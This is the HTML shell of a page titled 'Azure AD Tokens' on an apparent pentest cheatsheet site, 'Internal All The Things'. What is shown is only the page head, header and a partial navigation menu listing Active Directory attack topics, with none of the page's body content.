
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Active Directory and Internal Pentest Cheatsheets">
      
      
      
        <link rel="canonical" href="https://hktalent.github.io/InternalAllTheThings/cloud/azure/azure-access-and-token/">
      
      
        <link rel="prev" href="../../aws/aws-training/">
      
      
        <link rel="next" href="../azure-ad-connect/">
      
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.3">
    
    
      
        <title>Azure AD Tokens - Internal All The Things</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.50c56a3b.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../../custom.css">
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
      
        <meta  property="og:type"  content="website" >
      
        <meta  property="og:title"  content="Azure AD Tokens - Internal All The Things" >
      
        <meta  property="og:description"  content="Active Directory and Internal Pentest Cheatsheets" >
      
        <meta  property="og:image"  content="https://hktalent.github.io/InternalAllTheThings/assets/images/social/cloud/azure/azure-access-and-token.png" >
      
        <meta  property="og:image:type"  content="image/png" >
      
        <meta  property="og:image:width"  content="1200" >
      
        <meta  property="og:image:height"  content="630" >
      
        <meta  property="og:url"  content="https://hktalent.github.io/InternalAllTheThings/cloud/azure/azure-access-and-token/" >
      
        <meta  name="twitter:card"  content="summary_large_image" >
      
        <meta  name="twitter:title"  content="Azure AD Tokens - Internal All The Things" >
      
        <meta  name="twitter:description"  content="Active Directory and Internal Pentest Cheatsheets" >
      
        <meta  name="twitter:image"  content="https://hktalent.github.io/InternalAllTheThings/assets/images/social/cloud/azure/azure-access-and-token.png" >
      
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#azure-ad-tokens" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="Internal All The Things" class="md-header__button md-logo" aria-label="Internal All The Things" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Internal All The Things
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Azure AD Tokens
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/hktalent/InternalAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="Internal All The Things" class="md-nav__button md-logo" aria-label="Internal All The Things" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Internal All The Things
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/hktalent/InternalAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Internal All The Things
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Active directory
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Active directory
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adcs-certificate-services/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Certificate Services
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adds-acl-ace/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Access Controls ACL/ACE
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adds-enumerate/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Enumeration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adds-group-policy-objects/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Group Policy Objects
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adds-groups/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Groups
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adds-linux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Linux
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adds-ntds-dumping/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - NTDS Dumping
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adds-rodc/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Read Only Domain Controller
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adfs-federation-services/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Federation Services
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-integrated-dns/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Integrated DNS - ADIDNS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-roasting-asrep/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Roasting - ASREP Roasting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-roasting-kerberoasting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Roasting - Kerberoasting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-roasting-timeroasting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Roasting - Timeroasting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-tricks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Tricks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/deployment-sccm/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Deployment - SCCM
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/deployment-wsus/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Deployment - WSUS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/hash-capture/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hash - Capture and Cracking
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/hash-over-pass-the-hash/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hash - OverPass-the-Hash
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/hash-pass-the-hash/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hash - Pass-the-Hash
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/internal-dcom/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Internal - DCOM
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/internal-mitm-relay/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Internal - MITM and Relay
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/internal-pxe-boot-image/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Internal - PXE Boot Image
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/internal-shares/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Internal - Shares
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/kerberos-bronze-bit/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos - Bronze Bit
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/kerberos-delegation-constrained/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos Delegation - Constrained Delegation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/kerberos-delegation-rbcd/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos Delegation - Resource Based Constrained Delegation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/kerberos-delegation-unconstrained/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos Delegation - Unconstrained Delegation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/kerberos-s4u/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos - Service for User Extension
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/kerberos-tickets/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos - Tickets
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/pwd-comments/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - AD User Comment
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/pwd-dsrm-credentials/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - DSRM Credentials
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/pwd-group-policy-preferences/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - Group Policy Preferences
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/pwd-precreated-computer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - Pre-Created Computer Account
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/pwd-read-gmsa/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - GMSA
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/pwd-read-laps/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - LAPS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/pwd-shadow-credentials/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - Shadow Credentials
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/pwd-spraying/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - Spraying
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/trust-pam/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Trust - Privileged Access Management
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/trust-relationship/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Trust - Relationship
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/trust-sid-hijacking/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Child Domain to Forest Compromise - SID Hijacking
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/trust-ticket/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Forest to Forest Compromise - Trust Ticket
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_42" >
        
          
          <label class="md-nav__link" for="__nav_2_42" id="__nav_2_42_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    CVE
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_42_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_42">
            <span class="md-nav__icon md-icon"></span>
            CVE
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/CVE/MS14-068/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    MS14-068 Checksum Validation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/CVE/NoPAC/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NoPAC / samAccountName Spoofing
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/CVE/PrintNightmare/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    PrintNightmare
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/CVE/PrivExchange/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    PrivExchange
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/CVE/ZeroLogon/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ZeroLogon
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Cheatsheets
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Cheatsheets
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/escape-breakout/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Application Escape and Breakout
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/hash-cracking/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hash Cracking
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/mimikatz-cheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Mimikatz
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/miscellaneous-tricks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Miscellaneous & Tricks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/mssql-server-cheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    MSSQL Server
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/network-discovery/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Network Discovery
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/powershell-cheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Powershell
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
